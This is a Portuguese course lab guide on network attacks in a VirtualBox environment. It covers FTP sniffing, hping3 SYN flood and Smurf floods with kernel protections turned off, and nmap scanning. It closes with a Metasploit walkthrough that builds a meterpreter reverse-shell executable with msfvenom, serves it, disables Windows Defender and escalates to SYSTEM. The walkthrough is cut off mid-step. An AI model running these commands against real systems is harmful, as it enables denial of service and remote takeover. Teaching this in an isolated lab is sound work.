ifdef::oneof[]
////
= SEG2 - Sessão 2
:Author: Francisco_Marcelo,_Marcelo_Karam_e_Felipe_Scarel
:Author Initials: FM & MK & FS
////
:doctype: article
:source-highlighter: rouge
:listing-caption: Listing
:pdf-page-size: A4
:revdate: 10-04-2019
:imagesdir: ../img
:srcdir: ../src
:icons: font
include::../../share/attributes.adoc[]
endif::oneof[]

== Sessão 2: Explorando vulnerabilidades em redes

=== 1) Transferindo arquivos da máquina física para as VMs

[WARNING]
====
Esta atividade será realizada em sua máquina física (hospedeira).
====

Muito frequentemente teremos, neste curso, de mover programas e arquivos localizados na máquina física para uma das máquinas virtuais executando no Virtualbox. Para configurar o ambiente para que essas cópias sejam fáceis, siga os passos a seguir:

1. Dentro da console do Virtualbox de uma máquina virtual (neste exemplo, vamos usar a VM _WinServer-G_), acesse o menu _Devices_ > _Shared Folders_ > _Shared Folder Settings..._ .

2. Clique na pasta com o ícone `+` no canto superior da tela, que diz _Adds new shared folder_.

3. Em _Folder Path_, clique na seta e depois em _Other..._ . Em seguida, navegue até a pasta a ser compartilhada entre a máquina física e a VM e clique em _Select Folder_. Abaixo, marque as caixas _Auto-mount_ e _Make Permanent_. Sua janela deve ficar assim:
+
.Configuração de pasta compartilhada no Virtualbox
[#img-sharedfolder]
image::virtualbox-1.png[align="center"]

4. Agora, reinicie a máquina _WinServer-G_. Após o _reboot_, abra o Windows Explorer e verifique que há um novo local de rede montado. No exemplo abaixo, a pasta compartilhada tem o nome _shared_.
+
.Visualização de pasta compartilhada no Virtualbox
[#img-sharedfolder-view]
image::virtualbox-2.png[align="center"]

5. Pronto! Agora, basta fazer o download de programas e arquivos em sua máquina física, colocá-los dentro da pasta compartilhada, e suas VMs terão acesso imediato. Para concluir, repita o procedimento para a máquina _WinClient-G_.

=== 2) *_Sniffers_* para captura de dados

[WARNING]
====
Esta atividade será realizada na máquina virtual _WinServer-G_.
====

1. Como o usuário _Administrator_, copie o instalador do Wireshark (o arquivo `Wireshark-win64-3.0.0.exe` disponível na pasta _Programas_ do curso) para a máquina _WinServer-G_, usando a pasta compartilhada configurada anteriormente. Inicie sua instalação.
+
.Instalação do Wireshark, parte 1
[#img-wireshark-1]
image::wireshark-1.png[align="center"]
+
Aceite todas as opções padrão do instalador. Confirme também a instalação do Npcap, uma dependência do Wireshark, com suas opções padrão.
+
.Instalação do Wireshark, parte 2
[#img-wireshark-2]
image::wireshark-2.png[align="center"]
+
Ao final do processo, inicie o Wireshark -- você deverá ver uma janela como a que se segue:
+
.Instalação do Wireshark, parte 3
[#img-wireshark-3]
image::wireshark-3.png[align="center"]

2. Ative a captura de pacotes da placa de rede conectada à DMZ (o nome da interface deve ser _Ethernet_). Clique na barbatana azul no canto superior esquerdo da janela que diz _Start capturing packets_.

3. No campo _Apply a display filter_, digite `ftp` e pressione ENTER. A janela de captura deve ficar vazia, já que não há tráfego FTP acontecendo no momento.

4. Em outra janela, abra o _prompt_ de comando do Windows (`cmd`) e digite o comando `ftp linorg.usp.br` . Em seguida, informe o usuário como sendo `aluno`, com senha `123456` .
ifdef::gabarito[]
+
.Envio de usuário/senha por FTP
[#img-wireshark-4]
image::wireshark-4.png[align="center"]
endif::gabarito[]

5. De volta ao Wireshark, pare a captura de pacotes e verifique se você consegue visualizar o usuário e a senha informados.
ifdef::gabarito[]
+
Na imagem abaixo podemos confirmar que, de fato, o usuário e senha são passados em claro pela rede.
+
.Captura de sessão FTP no Wireshark
[#img-wireshark-5]
image::wireshark-5.png[align="center"]
endif::gabarito[]

=== 3) Ataque SYN *_flood_*

[WARNING]
====
Esta atividade será realizada nas máquinas virtuais _FWGW1-G_ e _KaliLinux-G_.
====

Agora, vamos identificar e compreender ataques DoS (_Denial of Service_) e fazer a análise com um _sniffer_ (Wireshark e/ou `tcpdump`) para interpretar o modo como os pacotes são elaborados para o respectivo ataque DoS.

Primeiro, vamos investigar o ataque _SYN flood_. Como tratado na parte teórica do curso, esse ataque consiste em enviar uma grande número de pacotes com a flag SYN ativa. Para realizar o ataque, iremos utilizar a ferramenta `hping3`.

1. Será necessário desativar a proteção contra _SYN Flooding_ do kernel da máquina-alvo, que será a VM _FWGW1-G_. Altere o valor do parâmetro no arquivo `/proc/sys/net/ipv4/tcp_syncookies`.
ifdef::gabarito[]
+
....
# hostname
FWGW1-A
....
+
....
# cat /proc/sys/net/ipv4/tcp_syncookies
1
....
+
....
# echo 0 > /proc/sys/net/ipv4/tcp_syncookies
....
endif::gabarito[]

2. Agora, vamos iniciar uma captura de pacotes, aguardando o ataque. Ainda na máquina _FWGW1-G_, use o `tcpdump` para monitorar os pacotes vindos da DMZ -- através da interface `enp0s8`.
ifdef::gabarito[]
+
....
# tcpdump ip -i enp0s8 -n host not 172.16.1.254
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes
....
+
Note que o filtro acima exclui pacotes IPv6 e pacotes vindos da máquina física (que também encontra-se conectada à rede _host-only_, com o endereço 172.16.1.254), para não atrapalhar o processo de análise.
endif::gabarito[]

3. Na máquina _KaliLinux-G_, como usuário `root`, use o `hping3` para iniciar um ataque _SYN flood_ com destino à máquina _FWGW1-G_, na porta do serviço SSH (com o objetivo, no caso do atacante, de esgotar os recursos de atendimento do serviço a usuários legítimos), com máxima velocidade de output e randomizando os IPs de origem dos pacotes.
ifdef::gabarito[]
+
....
# hostname
KaliLinux-A
....
+
....
# hping3 172.16.1.1 -S -p 22 --flood --rand-source
HPING 172.16.1.1 (enp0s3 172.16.1.1): S set, 40 headers + 0 data bytes
hping in flood mode, no replies will be shown
....
+
--
* `-S` ativa a _flag_ SYN nos pacotes.
* `-p 22` determina que a porta de destino será 22/TCP.
* `--flood` envia pacotes o mais rápido possível, sem mostrar respostas.
* `--rand-source` habilita o modo de envio com endereços de origem randomizados.
--
endif::gabarito[]

4. Ainda com o `hping3` executando, volte à máquina _FWGW1-G_ e verifique que o ataque está sendo realizado como esperado e interprete a saída do `tcpdump`. Tente abrir uma nova conexão `ssh` -- o que acontece?
ifdef::gabarito[]
+
Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto de 8 pacotes do _output_ do `tcpdump`:
+
....
14:34:46.611124 IP 37.216.172.87.61777 > 172.16.1.1.22: Flags [S], seq 1722418881, win 512, length 0
14:34:46.612051 IP 196.103.179.0.61789 > 172.16.1.1.22: Flags [S], seq 656608080, win 512, length 0
14:34:46.612064 IP 237.165.139.119.61790 > 172.16.1.1.22: Flags [S], seq 584215547, win 512, length 0
14:34:46.612069 IP 41.126.172.32.61791 > 172.16.1.1.22: Flags [S], seq 520478412, win 512, length 0
14:34:46.612074 IP 164.4.165.114.61792 > 172.16.1.1.22: Flags [S], seq 316807998, win 512, length 0
14:34:46.612079 IP 239.174.101.252.61793 > 172.16.1.1.22: Flags [S], seq 797534175, win 512, length 0
14:34:46.612082 IP 80.98.63.179.61794 > 172.16.1.1.22: Flags [S], seq 1624228209, win 512, length 0
14:34:46.612086 IP 92.168.164.203.61795 > 172.16.1.1.22: Flags [S], seq 1084913676, win 512, length 0
....
+
Note que os IPs de origem são todos distintos, como esperado. Além disso, todos possuem a _flag_ SYN ativada e objetivam a porta 22/TCP do servidor, numa tentativa de exaurir recursos para tratamento de conexão de novos clientes.
+
Assim que o servidor recebe o SYN inicial, ele aloca memória para atender o cliente e responde com um SYN-ACK. No caso de um ataque SYN _flood_, como o desta atividade, o atacante envia um grande número de pacotes SYN sem qualquer intenção de responder o SYN-ACK recebido com um ACK (e, assim, fechar o _three-way handshake_). Se o atacante estiver usando endereços IP _spoofed_, o que estamos fazendo, o SYN-ACK sequer chega a ser recebido.
+
Durante este período o servidor não pode fechar a conexão com um pacote RST, e ela permanece aberta. Antes do _timeout_, outros pacotes SYN vindos do atacante chegam, e começam a deixar um número crescente de conexões em estado _half-open_. Eventualmente, as tabelas de _overflow_ de conexão de servidor ficam cheias, e clientes legítimos têm seu acesso negado ao serviço. Para testar esse efeito, tente abrir uma nova conexão `ssh` com a máquina _FWGW1-G_ -- após algum tempo, o sistema nos retorna com _timeout_.
+
....
$ ssh aluno@172.16.1.1
ssh: connect to host 172.16.1.1 port 22: Connection timed out
....
+
Para verificar a tabela de conexões corrente, podemos usar o comando `ss`:
+
....
# ss -nta | grep '^SYN-RECV' | head -n5
SYN-RECV   0      0      172.16.1.1:22                 142.97.227.2:36000
SYN-RECV   0      0      172.16.1.1:22                 15.198.184.201:18948
SYN-RECV   0      0      172.16.1.1:22                 21.212.184.142:2254
SYN-RECV   0      0      172.16.1.1:22                 201.62.25.47:18949
SYN-RECV   0      0      172.16.1.1:22                 14.55.146.26:18953
....
+
Verificando a lista de conexões abertas e em espera pelo `ssh`, observamos o valor 128 no campo _Send-Q_:
+
....
# ss -nta | sed -n '1p;/^LISTEN.*:22/p' | grep -v ':::'
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
LISTEN     0      128          *:22                       *:*
....
+
Esse campo denota o número de bytes não confirmados como recebidos pelo receptor, efetivamente configurando a fila de envio do sistema. Para mais detalhes sobre esse campo em particular, verifique a _manpage_ do comando `netstat` via `man 8 netstat`.
+
O número 128 é idêntico aos _sysctls_ `net.ipv4.tcp_max_syn_backlog` e `net.core.somaxconn`, como visualizado abaixo:
+
....
# sysctl -a | grep max_syn_backlog
net.ipv4.tcp_max_syn_backlog = 128
....
+
....
# sysctl -a | grep somaxconn
net.core.somaxconn = 128
....
+
Esses _sysctls_ são definidos como:
+
--
* `net.ipv4.tcp_max_syn_backlog`: quantas conexões _half-open_ para as quais um cliente ainda não enviou pacote ACK correspondente podem ser mantidas na fila do kernel. O valor padrão, como visto, é de 128. Se essa fila estiver cheia, clientes legítimos não poderão conectar-se, como observamos anteriormente.
* `net.core.somaxconn`: número máximo que o _sysctl_ `net.ipv4.tcp_max_syn_backlog` pode assumir. Atua como um limite superior para o _sysctl_ anterior.
--
endif::gabarito[]

5. Na máquina _KaliLinux-G_, pare a execução do `hping3` com `CTRL + C`. Em seguida, reative a proteção _TCP SYN Cookies_ do kernel da máquina _FWGW1-G_.
ifdef::gabarito[]
+
....
# hostname
FWGW1-A

# echo 1 > /proc/sys/net/ipv4/tcp_syncookies
....
+
Os SYN _cookies_ implementam uma proteção em que o servidor responde cada SYN inicial com um SYN-ACK contendo o hash criptográfico de um número de sequência construído a partir do endereço IP do cliente, número de porta e outras informações de identificação. Quando o cliente responde, esse hash deve ser incluído no pacote ACK. Finalmente, o servidor verifica esse ACK e só então aloca memória para a conexão. Leia mais sobre os SYN _cookies_ em: https://cr.yp.to/syncookies.html .
endif::gabarito[]

=== 4) Ataque *_Smurf_*

[WARNING]
====
Esta atividade será realizada nas máquinas virtuais _FWGW1-G_, _LinServer-G_ e _KaliLinux-G_.
====

Agora, vamos trabalhar o ataque _Smurf_. Como já tratado na parte teórica deste curso, esse ataque consiste no envio de pacotes ICMP _echo-request_ para o endereço de _broadcast_ de uma rede desprotegida. Assim, todas as máquinas responderão para o endereço de origem especificado no pacote que deve estar alterado para o endereço alvo (efetivamente, realizando um _spoofing_).

1. Será necessário desativar a proteção contra ICMP _echo-request_ para endereço de broadcast no kernel da máquina-alvo, que será a VM _FWGW1-G_, bem como nas máquinas que responderão aos _echo-requests_ (_KaliLinux-G_ e _LinServer-G_). Altere o valor do parâmetro no arquivo `/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts` nas três máquinas.
ifdef::gabarito[]
+
....
# hostname
FWGW1-A
....
+
....
# echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
....
+
....
# hostname
LinServer-A
....
+
....
# echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
....
+
....
# hostname
KaliLinux-A
....
+
....
# echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
....
endif::gabarito[]

2. Inicie a captura de pacotes, aguardando o ataque. Na máquina _FWGW1-G_, use o `tcpdump` para monitorar os pacotes vindos da DMZ, através da interface `enp0s8`.
ifdef::gabarito[]
+
....
# tcpdump ip -i enp0s8 -n host not 172.16.1.254
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes
....
endif::gabarito[]

3. Na máquina _KaliLinux-G_, use o `hping3` para iniciar um ataque _Smurf_ com destino à máquina _FWGW1-G_. Envie pacotes ICMP com a máxima velocidade possível para o endereço de _broadcast_ da rede, falsificando a origem com o IP da vítima.
ifdef::gabarito[]
+
....
# hostname
KaliLinux-A
....
+
....
# hping3 172.16.1.255 --icmp --flood --spoof 172.16.1.1
HPING 172.16.1.255 (enp0s3 172.16.1.255): icmp mode set, 28 headers + 0 data bytes
hping in flood mode, no replies will be shown
....
+
--
* `--icmp` ativa o modo ICMP; por padrão, o `hping3` envia pacotes do tipo _echo-request_, que é o que objetivamos.
* `--flood` envia pacotes o mais rápido possível, sem mostrar respostas.
* `--spoof 172.16.1.1` falsifica o IP de origem dos pacotes enviados para _broadcast_ como sendo o IP da máquina _FWGW1-G_.
--
endif::gabarito[]

4. De volta à máquina _FWGW1-G_, verifique que o ataque está sendo realizado como esperado e interprete a saída do `tcpdump`.
ifdef::gabarito[]
+
Como a saída é muito veloz e ininterrupta, mostramos abaixo um pequeno excerto de 8 pacotes do _output_ do `tcpdump`:
+
....
14:56:31.489287 IP 172.16.1.1 > 172.16.1.255: ICMP echo request, id 1036, seq 56940, length 8
14:56:31.489291 IP 172.16.1.30 > 172.16.1.1: ICMP echo reply, id 1036, seq 57196, length 8
14:56:31.489292 IP 172.16.1.1 > 172.16.1.255: ICMP echo request, id 1036, seq 57196, length 8
14:56:31.489294 IP 172.16.1.30 > 172.16.1.1: ICMP echo reply, id 1036, seq 57452, length 8
14:56:31.489295 IP 172.16.1.1 > 172.16.1.255: ICMP echo request, id 1036, seq 57452, length 8
14:56:31.489297 IP 172.16.1.30 > 172.16.1.1: ICMP echo reply, id 1036, seq 57708, length 8
14:56:31.490336 IP 172.16.1.10 > 172.16.1.1: ICMP echo reply, id 1036, seq 45932, length 8
14:56:31.490347 IP 172.16.1.10 > 172.16.1.1: ICMP echo reply, id 1036, seq 46188, length 8
....
+
Note que a máquina _FWGW1-G_ identifica o seu próprio IP como sendo o originário dos pacotes _echo-request_ enviados para _broadcast_. A seguir, as máquinas _LinServer-G_ e _KaliLinux-G_ (esta, a atacante), respondem em massa com ICMP _echo-replies_ para a vítima, sobrecarregando seus recursos.
+
Finalmente, pode-se usar também a opção `-d` (ou `--data`, para _data size_) do `hping3`, fazendo com que o tamanho dos pacotes _echo-request_ -- e por conseguinte dos _echo-replies_ -- seja tão grande quanto o definido na linha de comando. Isso pode ser utilizado para dar mais força ao ataque, e consumir mais rapidamente a banda da vítima.
endif::gabarito[]

5. Reative a proteção para ignorar ICMP _echo-requests_ direcionados a _broadcast_ do kernel das máquinas _FWGW1-G_, _LinServer-G_ e _KaliLinux-G_.
ifdef::gabarito[]
+
....
# hostname
FWGW1-A
....
+
....
# echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
....
+
....
# hostname
LinServer-A
....
+
....
# echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
....
+
....
# hostname
KaliLinux-A
....
+
....
# echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts
....
endif::gabarito[]

=== 5) Levantamento de serviços usando o *_nmap_*

[WARNING]
====
Esta atividade será realizada nas máquinas virtuais _FWGW1-G_, _WinServer-G_ e _KaliLinux-G_.
====

Agora, vamos entender o funcionamento e utilidades da ferramenta `nmap`.

1. Na máquina _WinServer-G_, inicie o Wireshark e faça-o escutar por pacotes vindos para a interface _Ethernet_. Em paralelo, na máquina _KaliLinux-G_, use o `nmap` para fazer um _scan_ _verbose_ da máquina _WinServer-G_. Analise e compare os resultados obtidos pelo `nmap` com o que foi observado no Wireshark.
ifdef::gabarito[]
+
Primeiro, vamos ver o que acontece na máquina _KaliLinux-G_:
+
....
# nmap -v 172.16.1.20
Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-08 02:41 -03
Initiating ARP Ping Scan at 02:41
Scanning 172.16.1.20 [1 port]
Completed ARP Ping Scan at 02:41, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:41
Completed Parallel DNS resolution of 1 host. at 02:41, 0.02s elapsed
Initiating SYN Stealth Scan at 02:41
(...)
Completed SYN Stealth Scan at 02:41, 3.07s elapsed (1000 total ports)
Nmap scan report for 172.16.1.20
Host is up (0.000095s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
MAC Address: 08:00:27:F6:50:68 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.18 seconds
           Raw packets sent: 1189 (52.300KB) | Rcvd: 1001 (40.052KB)
....
+
Solicita-se um _scan_ _verbose_ da máquina _WinServer-G_. Após resolução ARP/DNS, o `nmap` escaneia as mil portas mais comuns para cada protocolo. Depois, ele relata quais portas foram detectadas como abertas, juntamente com o nome de serviço que usualmente escuta naquela porta.
+
Mas... que mil portas são essas? Elas são definidas no arquivo `/usr/share/nmap/nmap-services`, que possui grande similaridade com o arquivo `/etc/services` -- mas, além de listar o serviço na primeira coluna e porta/protocolo na segunda coluna, há uma terceira coluna que indica a probabilidade que uma dada porta seja encontrada aberta. Essa probabilidade é obtida pela equipe do `nmap` a partir de _scans_ de pesquisa na Internet ao largo.
+
Por exemplo, para descobrir quais são as dez portas mais populares, basta executar:
+
....
# cat /usr/share/nmap/nmap-services | grep -v '^#' | awk '{print $3,$2,$1}' | sort -n | tac | head -n10
....
+
....
0.484143 80/tcp http
0.450281 631/udp ipp
0.433467 161/udp snmp
0.365163 137/udp netbios-ns
0.330879 123/udp ntp
0.297830 138/udp netbios-dgm
0.293184 1434/udp ms-sql-m
0.253118 445/udp microsoft-ds
0.244452 135/udp msrpc
0.228010 67/udp dhcps
....
+
Finalmente, vamos ver o que aparece no Wireshark da máquina _WinServer-G_:
+
.Captura de scan nmap contra a máquina WinServer-G
[#img-nmap-1]
image::nmap-1.png[align="center"]
+
Note que uma série de pacotes SYN são enviados para diferentes portas do servidor Windows. Por sua vez, o Windows responde com um ACK se a porta estiver aberta, mas o `nmap` não envia um SYN/ACK em resposta a esse pacote -- esse é o modo padrão de _scan_ do `nmap`, TCP SYN, também conhecido como _half-open scan_.
endif::gabarito[]

2. Vamos agora explorar outros modos de funcionamento do `nmap`. Teste os modos: (1) _TCP connect scan_, (2) _TCP NULL scan_, (3) _TCP FIN scan_ e (4) _TCP Xmas scan_, e acompanhe o andamento da varredura de portas através do Wireshark. Procure entender o que está acontecendo e a diferença entre comandos executados, para verificar os conceitos do material teórico.
+
[TIP]
====
Recomenda-se a leitura da página de manual do `nmap`, via comando `man 1 nmap`, para estudar o que cada um desses tipos de _scan_ objetiva. A página de manual do `nmap` é extremamente detalhada e bem-escrita, e uma fonte valiosa de conhecimento relativo à enumeração e teste de vulnerabilidades de máquinas-alvo.

O guia de referência do `nmap` também possui um capítulo dedicado às diferentes técnicas para _port scanning_, acessível em https://nmap.org/book/man-port-scanning-techniques.html .
====
ifdef::gabarito[]
+
Respectivamente, os _scans_ do tipo _connect_, _NULL_, _FIN_ e _Xmas_ podem ser realizados com os comandos:
+
....
# nmap -sT 172.16.1.20
....
+
....
# nmap -sN 172.16.1.20
....
+
....
# nmap -sF 172.16.1.20
....
+
....
# nmap -sX 172.16.1.20
....
endif::gabarito[]

3. Outra funcionalidade do `nmap` é o _OS fingerprinting_. Utilize a opção que ativa essa verificação nas máquinas virtuais _FWGW1-G_ e _WinServer-G_. Use o `tcpdump` e o Wireshark para verificar a troca de pacotes neste processo.
ifdef::gabarito[]
+
Primeiro, vamos escanear a máquina _FWGW1-G_, realizando o _OS fingerprinting_ (opção `-O`):
+
....
# nmap -O 172.16.1.1

(...)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
....
+
Detectou-se que o SO da máquina-alvo é um kernel Linux, versões 3.2 a 4.9. Vamos verificar se o `nmap` está correto, logando na máquina _FWGW1-G_ e imprimindo a versão do kernel:
+
....
# hostname
FWGW1-A
....
+
....
# uname -r
4.9.0-8-amd64
....
+
Perfeito! Vamos partir para o _scan_ da máquina _WinServer-G_:
+
....
# nmap -O 172.16.1.20

(...)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
(...)

Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.04 seconds
....
+
A detecção do `nmap` para o Windows Server 2019, ao que parece, não foi muito precisa. Podemos adicionar a opção `--fuzzy` à invocação do `nmap` para obter resultados mais representativos:
+
....
# nmap -O --fuzzy 172.16.1.20

(...)
Aggressive OS guesses: Microsoft Windows Server 2012 (93%), Microsoft Windows Longhorn (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1703 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 1511 (90%), Microsoft Windows Server 2008 R2 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
(...)

Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.31 seconds
....
+
Em geral, a assinatura da máquina _WinServer-G_ assemelha-se a um sistema Windows Server 2012-2016. Vamos ver se isso procede:
+
.Versão do SO na máquina WinServer-G
[#img-nmap-2]
image::nmap-2.png[align="center"]
+
Como podemos observar, o _WinServer-G_ é um Windows Server 2019 Datacenter -- os resultados no `nmap` deixam um pouco a desejar, nesse caso.
endif::gabarito[]

=== 6) Realizando um ataque com o Metasploit em ambiente Windows

[WARNING]
====
Esta atividade será realizada nas máquinas virtuais _WinServer-G_ e _KaliLinux-G_.
====

Nessa atividade iremos executar uma série de comandos utilizando o `metasploit` disponível na máquina _KaliLinux-G_. O objetivo desta atividade é demonstrar duas coisas: primeiro, o poder da ferramenta Metasploit, e, segundo, que não devemos executar binários de fontes desconhecidas ou outros artefatos potencialmente maliciosos.

1. Primeiro, vamos gerar um executável malicioso usando a ferramenta `msfvenom` -- um gerador de _payloads_ e _encoder_ integrante da suíte do Metasploit. Acesse a máquina _KaliLinux-G_ como `root`, e execute-o:
+
....
# hostname
KaliLinux-A
....
+
....
# whoami
root
....
+
....
# msfvenom -a x64                                 \
           --platform windows                     \
           -p windows/x64/meterpreter/reverse_tcp \
           LHOST=172.16.1.30                      \
           LPORT=4444                             \
           -f exe-only                            \
           -b '\x00'                              \
           -o /var/www/html/virus.exe

Found 3 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=7, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor chosen with final size 551
Payload size: 551 bytes
Final size of exe-only file: 6144 bytes
Saved as: /var/www/html/virus.exe
....
+
O que estamos fazendo?
+
--
a. Selecionamos a arquitetura e plataforma-alvos do ataque: `Windows/x64`.
b. Selecionamos o _payload_ a ser enviado junto com o executável que será gerado -- `windows/x64/meterpreter/reverse_tcp`. O `reverse_tcp` é um _payload_ que inicia uma conexão TCP reversa, isto é, da vítima para o atacante, com o objetivo de burlar restrições de firewall para abertura de portas na rede local.
c. Selecionamos o _host_ local -- esse é o IP da máquina que iniciará o _handler_ da conexão reversa, que faremos no passo seguinte. No caso, é a própria máquina _KaliLinux-G_, 172.16.1.30.
d. Selecionamos a porta na qual o cliente irá tentar buscar durante a conexão reversa. Aqui, foi escolhida a porta 4444, mas idealmente seria melhor selecionar uma porta popular, como 80 ou 443, que provavelmente estarão liberadas pelo firewall da rede.
e. Selecionamos o formato de saída do `msfvenom` -- `exe-only`. Isto irá produzir um executável padrão para ambiente Windows, colocando o _shellcode_ do _payload_ escolhido na seção `.text` do binário. É possível gerar um número bastante diverso de formatos de saída usando o `msfvenom`; pode-se consultá-los usando a opção `--list formats`.
f. Determinamos quais caracteres não devem ser incluídos no binário de saída -- apenas o caractere NUL (`\x00`), nesse caso.
g. Selecionamos o nome do arquivo de saída -- `/var/www/html/virus.exe`. Claro, esse é um nome (propositalmente) bastante óbvio -- um nome (e conteúdo executável) sugestivo são critérios fundamentais para que um ataque desse tipo tenha sucesso, pois o usuário deve acreditar que aquele arquivo é de fato útil e deve ser executado.
--

2. O próximo passo é disponibilizar o executável para a vítima. Felizmente, o Kali Linux já possui um servidor web instalado -- como já colocamos o arquivo na pasta apropriada, basta iniciar o Apache:
+
....
# systemctl start apache2
....

3. Antes de prosseguir, precisamos iniciar o _handler_ na máquina _KaliLinux-G_ que irá escutar a conexão TCP reversa:
+
....
# msfconsole
....
+
....
msf5 > use exploit/multi/handler
....
+
....
msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
....
+
....
msf5 exploit(multi/handler) > set LHOST 172.16.1.30
LHOST => 172.16.1.30
....
+
....
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
....
+
....
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.1.30:4444
....

4. Vamos prosseguir! Acesse a máquina _WinServer-G_ e abra o Windows PowerShell. Faça o download do executável gerado no passo (1) com o comando:
+
....
PS C:\Users\Administrator> wget http://172.16.1.30/virus.exe -OutFile .\virus.exe
....
+
Note que o executável é imediatamente detectado pelo antivírus nativo do sistema, o Windows Defender:
+
.Executável malicioso detectado pelo Windows Defender
[#img-metasploit-1]
image::metasploit-1.png[align="center"]
+
Evidentemente, fica clara facilidade de detecção por estarmos usando o _template_ padrão do Metasploit para entregar o _payload_, bem como o fato de não termos usado nenhuma técnica de evasão de antivírus. Neste momento, teríamos que empregar técnicas de ofuscação, criptografia ou codificação do executável para dificultar a detecção do antivírus, e assim conseguir efetivar o ataque -- esses temas, contudo, extrapolam o escopo desta atividade.

5. Vamos desativar o antivírus Windows Defender na máquina _WinServer-G_, e testar. Ainda no Windows PowerShell, execute:
+
....
PS C:\Users\Administrator> Uninstall-WindowsFeature -Name Windows-Defender

Success Restart Needed Exit Code      Feature Result
------- -------------- ---------      --------------
True    Yes            SuccessRest... {Windows Defender Antivirus}
WARNING: You must restart this server to finish the removal process.
....
+
Após algum tempo, o Windows Defenser será desinstalado. Para concluir o procedimento, é necessário reiniciar o servidor -- execute:
+
....
PS C:\Users\Administrator> Restart-Computer
....

6. Terá funcionado? Faça novamente o download do executável malicioso:
+
....
PS C:\Users\Administrator> wget http://172.16.1.30/virus.exe -OutFile .\virus.exe
....
+
Aparentemente, não fomos detectados! Execute o programa:
+
....
PS C:\Users\Administrator> .\virus.exe
....

7. De volta à console do _KaliLinux-G_, observe que o _handler_ recebeu a conexão reversa e iniciou o _meterpreter_, um _payload_ avançado que irá permitir-nos controlar a máquina _WinServer-G_ remotamente.
+
....
[*] Started reverse TCP handler on 172.16.1.30:4444
[*] Sending stage (206403 bytes) to 172.16.1.20
[*] Meterpreter session 1 opened (172.16.1.30:4444 -> 172.16.1.20:49675) at 2019-04-10 02:33:22 -0300

meterpreter >
....

8. Primeiro, vamos verificar que de fato acessamos a máquina _WinServer-G_. Execute:
+
....
meterpreter > sysinfo
Computer        : WINSERVER-A
OS              : Windows 2016 (Build 17763).
Architecture    : x64
System Language : pt_BR
Domain          : GRUPO
Logged On Users : 1
Meterpreter     : x64/windows
....
+
Vamos escalar privilégios dentro da máquina-alvo. Se você executar o comando `getuid`, irá notar que o `meterpreter` está executando como o usuário que invocou o executável originalmente (provavelmente, o usuário `Administrator`).
+
....
meterpreter > getuid
Server username: WINSERVER-A\Administrator
....
+
O Windows possui uma conta com privilégios ainda mais elevados que o `Administrator`, a conta `SYSTEM`. Essa conta possui os mesmos privilégios do administrador, mas pode também gerenciar todos os serviços, arquivos e volumes em nível de sistema operacional -- com efeito, uma espécie de "super-root" do SO. Felizmente, o `meterpreter` possui o _script_ `getsystem`, que permite a escalada de privilégio de forma automática:
+
....
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
....

9. Observe que nossa conexão atual está aberta apenas porque o processo `virus.exe` está operacional:
+
....
meterpreter > ps virus
Filtering on 'virus'

Process List
============

 PID   PPID  Name       Arch  Session  User                       Path
 ---   ----  ----       ----  -------  ----                       ----
 3180  3224  virus.exe  x64   1        WINSERVER-A\Administrator  C:\Users\Administrator\virus.exe
....
+
Se o usuário fechar o processo ou reiniciar a máquina, a conexão será perdida. Podemos usar o comando `migrate` para alterar o binário em que o `meterpreter` está alojado para manter conexão com a máquina mesmo que o programa `virus.exe` seja encerrado. Primeiro, vamos descobrir um processo adequado e então migrar para ele:
+
....
meterpreter > ps svchost
Filtering on 'svchost'

Process List
============

 PID   PPID  Name         Arch  Session  User                          Path
 ---   ----  ----         ----  -------  ----                          ----
